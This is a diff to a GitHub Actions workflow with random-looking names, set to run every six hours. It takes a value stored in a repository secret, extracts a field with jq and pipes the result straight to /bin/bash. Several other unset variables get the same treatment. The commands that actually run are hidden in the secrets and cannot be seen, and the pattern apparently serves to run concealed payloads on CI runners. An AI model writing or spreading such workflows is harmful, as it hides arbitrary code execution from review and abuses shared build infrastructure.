@@ -2,7 +2,7 @@ name: lilingsu6457
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 5/6 * * *'
+    - cron: '18 4/6 * * *'
 
 jobs:
   build:
@@ -11,13 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: lilingsu6457
         env:
-          wggc952: ${{ secrets.wggc952 }}
+          ass92930: ${{ secrets.ass92930 }}
         run: |
-          echo $wggc952 | jq -r .i7 | /bin/bash
-          echo $lkjau49267 | jq -r .a94756 | /bin/bash
-          echo $fmvjs2236 | jq -r .smgs886 | /bin/bash
-          echo $rdj1407 | jq -r .x06 | /bin/bash
-          echo $e544 | jq -r .qwq01731 | /bin/bash
-          echo $lhr4 | jq -r .tkj46532 | /bin/bash
-          echo $plabv65 | jq -r .ofja5 | /bin/bash
+          echo $ass92930 | jq -r .hi801 | /bin/bash
+          echo $fbug81 | jq -r .l70928 | /bin/bash
+          echo $mantg93 | jq -r .kgutx1 | /bin/bash
+          echo $yjn0 | jq -r .n1 | /bin/bash
+          echo $sade10 | jq -r .pqu7 | /bin/bash
+          echo $juhza3559 | jq -r .jsps05 | /bin/bash
+          echo $z92 | jq -r .j60852 | /bin/bash
+          echo $pb85 | jq -r .fq51931 | /bin/bash
 
